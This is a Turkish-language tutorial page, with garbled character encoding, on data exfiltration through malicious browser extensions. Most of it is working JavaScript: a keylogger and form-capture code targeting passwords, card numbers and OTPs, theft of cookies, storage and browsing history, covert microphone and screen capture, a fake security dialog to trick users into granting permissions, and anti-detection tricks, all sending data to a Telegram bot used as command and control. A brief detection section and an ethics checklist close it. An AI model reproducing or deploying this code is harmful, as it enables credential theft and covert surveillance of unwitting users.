# 02. Veri SÄ±zdÄ±rma - Ä°puÃ§larÄ± ve Teknikler

## ğŸ’¡ Praktik Ä°puÃ§larÄ±

---

### ğŸ“¡ C2 (Command & Control) Ä°puÃ§larÄ±

**1. Telegram Bot Kurulumu**
```bash
# Botfather komutlarÄ±
/start
/newbot
/setcommands
/setdescription

# Bot token format kontrolÃ¼
curl "https://api.telegram.org/bot<TOKEN>/getMe"
```

**2. Chat ID Bulma YÃ¶ntemleri**
```javascript
// Method 1: getUpdates API
fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`)
  .then(r => r.json())
  .then(data => console.log(data.result[0].message.chat.id));

// Method 2: Web console'da
// @userinfobot'a mesaj at, ID'yi al
```

**3. Rate Limiting Bypass**
```javascript
function sendWithDelay(messages, delay = 1000) {
    messages.forEach((msg, index) => {
        setTimeout(() => sendToTelegram(msg), index * delay);
    });
}

// Telegram limitleri:
// 30 mesaj/saniye (group)
// 1 mesaj/saniye (private)
```

---

### âŒ¨ï¸ Keylogger Optimizasyonu

**4. AkÄ±llÄ± Filtreleme**
```javascript
const targetFields = [
    'password', 'pass', 'pwd', 'passwd',
    'email', 'login', 'username', 'user',
    'card', 'cvv', 'ssn', 'phone',
    'pin', 'otp', 'token'
];

function isTargetField(element) {
    const name = (element.name || element.id || '').toLowerCase();
    const type = element.type || '';
    const placeholder = (element.placeholder || '').toLowerCase();
    
    return targetFields.some(field => 
        name.includes(field) || 
        placeholder.includes(field) ||
        type === 'password'
    );
}
```

**5. Buffer YÃ¶netimi**
```javascript
let keyBuffer = [];
const BUFFER_SIZE = 100;
const FLUSH_INTERVAL = 30000; // 30 saniye

function addToBuffer(keystroke) {
    keyBuffer.push({
        key: keystroke.key,
        field: keystroke.field,
        url: window.location.href,
        timestamp: Date.now()
    });
    
    if (keyBuffer.length >= BUFFER_SIZE) {
        flushBuffer();
    }
}

setInterval(flushBuffer, FLUSH_INTERVAL);
```

**6. Form Submission Yakalama**
```javascript
// Modern frameworks iÃ§in
document.addEventListener('submit', async function(e) {
    const form = e.target;
    
    // React/Vue form handling
    await new Promise(resolve => setTimeout(resolve, 100));
    
    const formData = new FormData(form);
    const sensitiveData = {};
    
    for (let [key, value] of formData.entries()) {
        if (isTargetField({name: key}) && value.length > 2) {
            sensitiveData[key] = value;
        }
    }
    
    if (Object.keys(sensitiveData).length > 0) {
        sendToTelegram(`ğŸ”‘ Form: ${JSON.stringify(sensitiveData)}`);
    }
});
```

---

### ğŸ“¸ GÃ¶rsel ve Ses KayÄ±t Ä°puÃ§larÄ±

**7. Ekran GÃ¶rÃ¼ntÃ¼sÃ¼ Optimizasyonu**
```javascript
function captureOptimizedScreenshot() {
    chrome.tabs.captureVisibleTab(null, {
        format: 'jpeg',
        quality: 70  // Boyut optimizasyonu
    }, function(dataUrl) {
        // BÃ¼yÃ¼k resimleri kÃ¼Ã§Ã¼lt
        resizeImage(dataUrl, 1024, 768)
            .then(resizedUrl => uploadToTelegram(resizedUrl));
    });
}

function resizeImage(dataUrl, maxWidth, maxHeight) {
    return new Promise(resolve => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const img = new Image();
        
        img.onload = () => {
            const ratio = Math.min(maxWidth/img.width, maxHeight/img.height);
            canvas.width = img.width * ratio;
            canvas.height = img.height * ratio;
            
            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
            resolve(canvas.toDataURL('image/jpeg', 0.7));
        };
        
        img.src = dataUrl;
    });
}
```

**8. Mikrofon Dinleme Stealth**
```javascript
async function stealthAudioCapture() {
    try {
        // Minimum configuration
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: {
                sampleRate: 16000,        // DÃ¼ÅŸÃ¼k kalite = kÃ¼Ã§Ã¼k boyut
                echoCancellation: false,
                noiseSuppression: false,
                autoGainControl: false
            }
        });
        
        const mediaRecorder = new MediaRecorder(stream, {
            mimeType: 'audio/webm;codecs=opus'
        });
        
        // 30 saniye kaydet, 5 dakika bekle
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }, 30000);
        
    } catch (e) {
        console.log('Ses izni yok');
    }
}
```

---

### ğŸŒ TarayÄ±cÄ± Data Harvesting

**9. Chrome History Deep Dive**
```javascript
function comprehensiveHistorySteal() {
    chrome.history.search({
        text: '',
        maxResults: 10000,
        startTime: Date.now() - (90 * 24 * 60 * 60 * 1000) // 90 gÃ¼n
    }, function(items) {
        
        // Kategorilere ayÄ±r
        const categories = {
            banking: [],
            social: [],
            shopping: [],
            email: [],
            crypto: [],
            adult: []
        };
        
        items.forEach(item => {
            const url = item.url.toLowerCase();
            
            if (url.includes('bank') || url.includes('credit')) {
                categories.banking.push(item);
            } else if (url.includes('facebook') || url.includes('twitter')) {
                categories.social.push(item);
            }
            // ... diÄŸer kategoriler
        });
        
        // En Ã¶nemlileri ilk gÃ¶nder
        Object.entries(categories).forEach(([cat, data]) => {
            if (data.length > 0) {
                sendToTelegram(`ğŸ·ï¸ ${cat.toUpperCase()}: ${data.length} site`);
            }
        });
    });
}
```

**10. Cookie & Storage Harvesting**
```javascript
function stealAllStorageData() {
    // Extension Storage
    chrome.storage.local.get(null, function(items) {
        if (Object.keys(items).length > 0) {
            sendToTelegram(`ğŸ—ƒï¸ Extension Storage: ${JSON.stringify(items)}`);
        }
    });
    
    // All Cookies
    chrome.cookies.getAll({}, function(cookies) {
        const importantCookies = cookies.filter(c => 
            c.name.includes('session') || 
            c.name.includes('auth') ||
            c.name.includes('token') ||
            c.name.includes('login')
        );
        
        if (importantCookies.length > 0) {
            sendToTelegram(`ğŸª Auth Cookies: ${importantCookies.length} adet`);
        }
    });
}
```

---

### ğŸ­ Sosyal MÃ¼hendislik

**11. Sahte Permission Dialog**
```javascript
function createFakeSecurityDialog() {
    const overlay = document.createElement('div');
    overlay.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;
                    background:rgba(0,0,0,0.9);z-index:999999;
                    display:flex;align-items:center;justify-content:center;">
            <div style="background:white;padding:30px;border-radius:8px;
                        box-shadow:0 4px 20px rgba(0,0,0,0.3);max-width:400px;
                        text-align:center;font-family:Arial,sans-serif;">
                <div style="font-size:48px;margin-bottom:20px;">ğŸ”’</div>
                <h2 style="color:#333;margin:0 0 10px;">GÃ¼venlik DoÄŸrulamasÄ±</h2>
                <p style="color:#666;margin:0 0 20px;line-height:1.4;">
                    HesabÄ±nÄ±zÄ±n gÃ¼venliÄŸi iÃ§in ses tabanlÄ± kimlik doÄŸrulamasÄ± gerekli.
                    Bu iÅŸlem otomatiktir ve 30 saniye sÃ¼rer.
                </p>
                <button onclick="requestPermissions()" 
                        style="background:#007bff;color:white;border:none;
                               padding:12px 24px;border-radius:4px;
                               font-size:16px;cursor:pointer;">
                    Devam Et
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);
}

function requestPermissions() {
    navigator.mediaDevices.getUserMedia({audio: true})
        .then(() => {
            document.querySelector('[style*="position:fixed"]').remove();
            startAudioSurveillance();
        });
}
```

---

### ğŸ“± Anti-Detection Teknikleri

**12. Network Fingerprint Masking**
```javascript
// User-Agent randomization
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
];

function randomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// API calls'Ä± randomize et
function sendWithRandomDelay(data) {
    const delay = Math.random() * 5000 + 1000; // 1-6 saniye
    setTimeout(() => sendToTelegram(data), delay);
}
```

**13. Error Handling**
```javascript
function robustSendToTelegram(data) {
    const maxRetries = 3;
    let retries = 0;
    
    async function attemptSend() {
        try {
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: data
                })
            });
            
            if (!response.ok && retries < maxRetries) {
                retries++;
                setTimeout(attemptSend, Math.pow(2, retries) * 1000);
            }
        } catch (error) {
            if (retries < maxRetries) {
                retries++;
                setTimeout(attemptSend, Math.pow(2, retries) * 1000);
            }
        }
    }
    
    attemptSend();
}
```

---

### ğŸ›¡ï¸ Detection & Monitoring

**14. Anomaly Detection Indicators**
```bash
# Network monitoring
netstat -an | grep :443 | wc -l  # HTTPS connection count
ss -tuln | grep telegram

# Process monitoring  
ps aux | grep chrome | awk '{print $11}' | sort | uniq -c

# Memory usage
cat /proc/meminfo | grep Available
```

**15. Browser Behavior Analysis**
```javascript
// Performance monitoring
window.addEventListener('load', () => {
    const perfData = performance.getEntriesByType('navigation')[0];
    
    if (perfData.loadEventEnd - perfData.loadEventStart > 5000) {
        console.warn('Slow page load - possible heavy extension activity');
    }
});

// Network request monitoring
const originalFetch = window.fetch;
window.fetch = function(...args) {
    console.log('Fetch request:', args[0]);
    return originalFetch.apply(this, args);
};
```

---

### âš–ï¸ Ethical Testing Guidelines

**16. Responsible Disclosure Checklist**
- [ ] Test sadece kendi sistemlerinizde yapÄ±lsÄ±n
- [ ] Production verilerini risk altÄ±na sokmayÄ±n  
- [ ] Legal authorization dokÃ¼manlarÄ± hazÄ±rlayÄ±n
- [ ] Zarar verici payload'lar kullanmayÄ±n
- [ ] BulduÄŸunuz zafiyetleri sorumlu ÅŸekilde bildirin

**17. Documentation Template**
```markdown
## Vulnerability Report

**Affected System:** [Browser Extension Name]
**Vulnerability Type:** Data Exfiltration via Keylogging
**Severity:** High
**Discovery Date:** [Date]

### Technical Details:
- Manifest permissions analysis
- Code injection points
- Data exfiltration methods

### Proof of Concept:
- [Safe, non-destructive demo]

### Impact Assessment:
- User data at risk
- Privacy implications
- Potential scale

### Recommended Fixes:
- CSP implementation
- Permission restrictions
- Input validation
```

---

## ğŸ“š Ã–nerilen Kaynaklar

- **OWASP Web Security Testing Guide**
- **Chrome Extension Security Best Practices**  
- **Network Security Monitoring**
- **Digital Forensics & Incident Response**

---

**Geri DÃ¶n:** [02. Sorular](02.veri-sizdirma.questions.md) | **Ana Sayfa:** [index.md](index.md) | **Sonraki Konu:** [03. Dinamik Payload](03.dinamik-payload.md)
